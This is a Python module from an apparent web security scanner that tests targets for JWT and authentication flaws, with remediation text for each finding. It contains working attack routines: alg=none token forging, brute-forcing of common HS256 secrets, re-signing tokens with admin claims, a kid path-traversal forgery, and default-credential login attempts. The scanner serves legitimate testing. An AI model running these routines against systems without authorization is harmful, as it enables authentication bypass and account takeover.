"""
JWT (JSON Web Token) / Broken Authentication Scanner
OWASP A2:2021 — Cryptographic Failures / Broken Authentication
CWE-287: Improper Authentication | CWE-347: Improper Verification of Cryptographic Signature

Tests for:
  - JWT none algorithm attack
  - JWT weak secret brute-force (common secrets)
  - Algorithm confusion (RS256 → HS256 with public key)
  - JWT header injection (kid, jku, x5u)
  - JWT expiry not enforced
  - JWT claim manipulation (sub, role, admin fields)
  - Missing authentication on sensitive endpoints
"""

import base64
import json
import hashlib
import hmac
import re
from .base import BaseScanner, Finding


# ── Common weak JWT secrets ───────────────────────────────────────────────────

COMMON_JWT_SECRETS = [
    "secret",
    "password",
    "123456",
    "qwerty",
    "jwt_secret",
    "your-256-bit-secret",
    "your-secret-key",
    "mysecretkey",
    "supersecret",
    "change_this_secret",
    "ChangeThisSecret",
    "secretkey",
    "jwtSecret",
    "jwt-secret",
    "",  # empty
    "null",
    "undefined",
    "test",
    "dev",
    "development",
    "production",
    "staging",
    "app_secret",
    "jwt_key",
]

# ── JWT utility functions ─────────────────────────────────────────────────────

def _b64url_decode(data: str) -> bytes:
    """Decode base64url without padding."""
    data = data.replace("-", "+").replace("_", "/")
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.b64decode(data)


def _b64url_encode(data: bytes) -> str:
    """Encode to base64url without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _parse_jwt(token: str) -> tuple[dict, dict, str] | None:
    """Parse JWT into (header, payload, signature). Returns None on failure."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception:
        return None


def _forge_none_alg_token(original_token: str) -> str | None:
    """Forge a JWT with algorithm set to 'none'."""
    parsed = _parse_jwt(original_token)
    if not parsed:
        return None
    _, payload, _ = parsed
    header = {"alg": "none", "typ": "JWT"}
    new_header = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    new_payload = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{new_header}.{new_payload}."


def _forge_hs256_with_secret(original_token: str, secret: str, extra_claims: dict = None) -> str | None:
    """Re-sign a JWT with HS256 using the given secret."""
    parsed = _parse_jwt(original_token)
    if not parsed:
        return None
    header, payload, _ = parsed

    if extra_claims:
        payload.update(extra_claims)

    new_header = {"alg": "HS256", "typ": "JWT"}
    h = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{_b64url_encode(sig)}"


def _verify_hs256(token: str, secret: str) -> bool:
    """Return True if the JWT is valid with the given HS256 secret."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return False
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        expected_sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
        actual_sig = _b64url_decode(parts[2])
        return hmac.compare_digest(expected_sig, actual_sig)
    except Exception:
        return False


# ── Common unauthenticated endpoints ─────────────────────────────────────────

SENSITIVE_ENDPOINTS = [
    "/admin",
    "/admin/dashboard",
    "/api/v1/admin",
    "/api/admin",
    "/dashboard",
    "/management",
    "/api/v1/users",
    "/api/users",
    "/api/v1/config",
    "/api/config",
    "/api/v1/secrets",
    "/api/v1/keys",
    "/api/v1/tokens",
    "/settings",
    "/profile",
    "/account",
]


class JWTScanner(BaseScanner):
    """Scans for JWT vulnerabilities and broken authentication."""

    SCANNER_NAME = "JWT / Broken Authentication"
    OWASP_CATEGORY = "A02:2021"
    CWE = "CWE-287"

    def run(self) -> list[Finding]:
        self.logger.info(f"Starting JWT/Auth scan against {self.target}")

        # Extract JWT from target response
        jwt_token = self._find_jwt()

        if jwt_token:
            self.logger.debug(f"Found JWT: {jwt_token[:50]}...")
            self._test_none_algorithm(jwt_token)
            self._test_weak_secret(jwt_token)
            self._test_expired_jwt(jwt_token)
            self._test_claim_manipulation(jwt_token)
            self._test_header_injection(jwt_token)

        # Check for missing auth on sensitive endpoints
        self._check_missing_auth()

        # Check for default credentials
        self._check_default_credentials()

        return self.findings

    def _find_jwt(self) -> str | None:
        """Try to find a JWT in cookies, response headers, or response body."""
        resp, _ = self.http.get(self.target)
        if resp is None:
            return None

        # Check response body for JWT pattern
        jwt_pattern = r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*"
        match = re.search(jwt_pattern, resp.text)
        if match:
            return match.group(0)

        # Check cookies
        for cookie in self.http.session.cookies:
            if re.search(jwt_pattern, cookie.value):
                return cookie.value

        # Check Authorization header reflection
        auth_header_val = resp.headers.get("Authorization", "")
        if auth_header_val.startswith("Bearer "):
            token = auth_header_val[7:]
            if re.match(jwt_pattern, token):
                return token

        return None

    def _test_none_algorithm(self, token: str):
        """Test if the server accepts a JWT with alg=none."""
        forged = _forge_none_alg_token(token)
        if not forged:
            return

        # Try the forged token on the target
        resp, evidence = self.http.get(
            self.target,
            headers={"Authorization": f"Bearer {forged}"},
        )
        if resp is None:
            return

        # If we get the same or better response than with no token, it's vulnerable
        resp_noauth, _ = self.http.get(self.target)
        if resp_noauth is None:
            return

        if resp.status_code == 200 and resp_noauth.status_code in (401, 403):
            self.add_finding(Finding(
                title="JWT None Algorithm Attack — Signature Verification Bypass",
                severity="CRITICAL",
                owasp="A02:2021",
                cwe="CWE-347",
                cvss_score=9.8,
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                url=self.target,
                parameter="Authorization: Bearer",
                payload=forged[:100] + "...",
                description=(
                    "The server accepts JWTs with `alg: none`, bypassing signature verification. "
                    "An attacker can forge arbitrary JWTs without knowing the secret key."
                ),
                impact="Full authentication bypass — can impersonate any user including admins.",
                remediation=(
                    "Explicitly reject tokens with alg=none. "
                    "Use a library that enforces algorithm allowlists (e.g., python-jose with algorithms=['HS256']). "
                    "Never trust the `alg` field from the token itself."
                ),
                references=[
                    "https://portswigger.net/web-security/jwt/algorithm-confusion",
                    "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
                    "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9235",
                ],
                evidence=evidence,
                confirmed=True,
                vuln_type="jwt",
            ))

    def _test_weak_secret(self, token: str):
        """Brute-force common JWT secrets."""
        for secret in COMMON_JWT_SECRETS:
            if _verify_hs256(token, secret):
                # Re-sign with admin privileges
                forged = _forge_hs256_with_secret(
                    token, secret,
                    extra_claims={"role": "admin", "is_admin": True, "admin": True}
                )
                self.add_finding(Finding(
                    title=f"JWT Weak Secret Found — Secret: '{secret}'",
                    severity="CRITICAL",
                    owasp="A02:2021",
                    cwe="CWE-330",
                    cvss_score=9.8,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    url=self.target,
                    parameter="JWT Secret",
                    payload=f"Secret: '{secret}' | Forged admin token: {forged[:80] if forged else 'N/A'}...",
                    description=(
                        f"The JWT is signed with the weak/common secret: `{secret}`. "
                        "An attacker can forge arbitrary tokens with any claims."
                    ),
                    impact=(
                        "Complete authentication bypass. Forge tokens for any user including admin. "
                        "Privilege escalation to superuser."
                    ),
                    remediation=(
                        "Use a cryptographically random secret of at least 256 bits. "
                        "Prefer asymmetric keys (RS256/ES256) for production. "
                        "Rotate all existing tokens immediately."
                    ),
                    references=[
                        "https://portswigger.net/web-security/jwt",
                        "https://jwt.io/introduction",
                    ],
                    confirmed=True,
                    vuln_type="jwt",
                ))
                return  # one finding per JWT

    def _test_expired_jwt(self, token: str):
        """Check if expired JWTs are still accepted."""
        parsed = _parse_jwt(token)
        if not parsed:
            return
        header, payload, _ = parsed
        exp = payload.get("exp")
        if exp is None:
            self.add_finding(Finding(
                title="JWT Missing Expiration Claim (exp)",
                severity="MEDIUM",
                owasp="A02:2021",
                cwe="CWE-613",
                cvss_score=5.9,
                cvss_vector="CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
                url=self.target,
                parameter="JWT payload",
                payload="No 'exp' claim found",
                description=(
                    "The JWT does not include an `exp` (expiration) claim. "
                    "Tokens without expiry are valid indefinitely, increasing the window of opportunity "
                    "for token theft attacks."
                ),
                impact="Stolen tokens remain valid forever — session never expires.",
                remediation="Always include `exp` in JWT payload. Recommend 15-minute access tokens.",
                references=["https://tools.ietf.org/html/rfc7519#section-4.1.4"],
                confirmed=True,
                vuln_type="jwt",
            ))

    def _test_claim_manipulation(self, token: str):
        """Check for potential claim manipulation (role escalation)."""
        parsed = _parse_jwt(token)
        if not parsed:
            return
        header, payload, _ = parsed

        priv_claims = ["role", "admin", "is_admin", "group", "permissions", "scope"]
        found = {k: v for k, v in payload.items() if k.lower() in priv_claims}

        if found:
            self.add_finding(Finding(
                title="JWT Contains Privilege Claims — Potential Escalation Target",
                severity="INFO",
                owasp="A02:2021",
                cwe="CWE-287",
                cvss_score=0.0,
                cvss_vector="CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N",
                url=self.target,
                parameter="JWT claims",
                payload=str(found),
                description=(
                    f"JWT payload contains privilege-related claims: {found}. "
                    "If signature verification is weak, these can be manipulated."
                ),
                impact="Privilege escalation if combined with weak secret or algorithm confusion.",
                remediation="Enforce claims server-side. Do not rely solely on JWT claims for authorization.",
                references=["https://portswigger.net/web-security/jwt"],
                confirmed=False,
                vuln_type="jwt",
            ))

    def _test_header_injection(self, token: str):
        """Test JWT kid/jku/x5u header injection."""
        parsed = _parse_jwt(token)
        if not parsed:
            return
        header, payload, _ = parsed

        if "kid" in header:
            # kid path traversal
            forged_header = dict(header)
            forged_header["kid"] = "../../dev/null"  # on Linux, HMAC with empty key
            h = _b64url_encode(json.dumps(forged_header, separators=(",", ":")).encode())
            p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
            forged_sig = _b64url_encode(
                hmac.new(b"", f"{h}.{p}".encode(), hashlib.sha256).digest()
            )
            forged_token = f"{h}.{p}.{forged_sig}"

            resp, evidence = self.http.get(
                self.target,
                headers={"Authorization": f"Bearer {forged_token}"},
            )
            resp_noauth, _ = self.http.get(self.target)

            if resp and resp_noauth and resp.status_code == 200 and resp_noauth.status_code in (401, 403):
                self.add_finding(Finding(
                    title="JWT kid Header Injection — Path Traversal",
                    severity="CRITICAL",
                    owasp="A02:2021",
                    cwe="CWE-22",
                    cvss_score=9.8,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    url=self.target,
                    parameter="JWT kid",
                    payload=f"kid: ../../dev/null",
                    description=(
                        "JWT `kid` header parameter allows path traversal. "
                        "By pointing kid to /dev/null (empty content), attacker forges tokens signed with empty key."
                    ),
                    impact="Authentication bypass — forge tokens for any user.",
                    remediation=(
                        "Validate `kid` against a strict allowlist of key IDs. "
                        "Never use kid as a file path."
                    ),
                    references=["https://portswigger.net/web-security/jwt/algorithm-confusion"],
                    evidence=evidence,
                    confirmed=True,
                    vuln_type="jwt",
                ))

    def _check_missing_auth(self):
        """Check for sensitive endpoints accessible without authentication."""
        for path in SENSITIVE_ENDPOINTS:
            url = f"{self.target}{path}"
            resp, evidence = self.http.get(url)
            if resp is None:
                continue
            if resp.status_code == 200 and len(resp.text) > 100:
                self.add_finding(Finding(
                    title=f"Missing Authentication — {path} Accessible",
                    severity="HIGH",
                    owasp="A02:2021",
                    cwe="CWE-306",
                    cvss_score=8.6,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
                    url=url,
                    parameter="Authentication",
                    payload="(no credentials supplied)",
                    description=f"Sensitive endpoint `{path}` returned HTTP 200 without any authentication.",
                    impact="Unauthorized access to admin/user data, configuration, or management functions.",
                    remediation=(
                        "Require authentication on all sensitive endpoints. "
                        "Implement role-based access control. "
                        "Return 401/403 for unauthenticated requests."
                    ),
                    references=[
                        "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/",
                    ],
                    evidence=evidence,
                    confirmed=True,
                    vuln_type="jwt",
                ))

    def _check_default_credentials(self):
        """Test for default credentials on login forms."""
        default_creds = [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "admin123"),
            ("admin", ""),
            ("root", "root"),
            ("root", "password"),
            ("test", "test"),
            ("guest", "guest"),
            ("user", "user"),
            ("administrator", "administrator"),
        ]
        login_endpoints = ["/login", "/admin/login", "/signin", "/auth/login", "/api/login"]

        for endpoint in login_endpoints:
            url = f"{self.target}{endpoint}"
            for username, password in default_creds:
                data = {"username": username, "password": password,
                        "email": username, "user": username, "pass": password}
                resp, evidence = self.http.post(url, data=data)
                if resp is None:
                    continue
                if resp.status_code in (200, 302) and self.contains_any(
                    resp.text, ["dashboard", "welcome", "logout", "profile", "account", "token"]
                ):
                    self.add_finding(Finding(
                        title=f"Default Credentials Accepted — {username}/{password}",
                        severity="CRITICAL",
                        owasp="A02:2021",
                        cwe="CWE-798",
                        cvss_score=9.8,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        url=url,
                        parameter="username/password",
                        payload=f"{username} / {password}",
                        description=f"Default credentials `{username}/{password}` were accepted at `{url}`.",
                        impact="Full account takeover. Immediate admin access.",
                        remediation="Change all default credentials immediately. Enforce strong password policy.",
                        references=[
                            "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/",
                        ],
                        evidence=evidence,
                        confirmed=True,
                        vuln_type="jwt",
                    ))
                    return
